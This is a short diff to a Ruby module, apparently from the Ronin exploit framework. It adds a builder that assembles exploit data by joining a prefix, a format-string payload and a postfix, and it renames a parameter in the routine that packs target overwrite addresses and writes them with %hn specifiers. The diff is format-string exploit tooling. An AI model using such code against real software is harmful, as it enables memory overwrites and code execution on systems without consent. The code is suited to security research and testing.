@@ -46,9 +46,13 @@ module Ronin
 
     def initialize(advisory=nil)
       super(advisory)
+
+      builder do |fmt|
+	fmt.data = fmt.prefix+build_format_string(get_target,payload.to_s)+fmt.postfix
+      end
     end
 
-    def build_format_string(target=get_target,payload="")
+    def build_format_string(target=get_target,payload_str="")
       buffer = target.overwrite.pack(target.platform.arch)+(target.overwrite+(target.platform.arch.address_length/2)).pack(target.platform.arch)
 
       low_mask = 0xff
@@ -68,7 +72,7 @@ module Ronin
 	high-=(target.platform.arch.address_length*2)
 	buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",high,target.pop_length+1,low-high,target.pop_length)
       end
-      buffer+=payload
+      buffer+=payload_str
 
       return buffer
     end
